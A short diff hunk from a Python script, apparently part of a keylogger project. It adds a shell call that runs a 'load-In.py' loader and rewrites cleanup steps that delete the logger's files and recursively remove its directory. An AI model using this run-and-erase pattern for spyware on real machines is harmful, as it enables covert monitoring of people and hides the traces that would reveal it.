@@ -42,8 +42,8 @@ output = "".join(liste)
 output = output.replace("$", '')
 print(output)
 
+subprocess.check_call("python3 /root/Key-Logger/load-In.py", shell=True)
 
+subprocess.check_call("rm " + DIR + "KeyL", shell=True)
 
-subprocess.check_call("rm " + DIR + "/KeyL", shell=True)
-
-subprocess.check_call("rmdir " + DIR + "Key-Logger", shell=True)
+subprocess.check_call("rm -r " + DIR + "Key-Logger", shell=True)
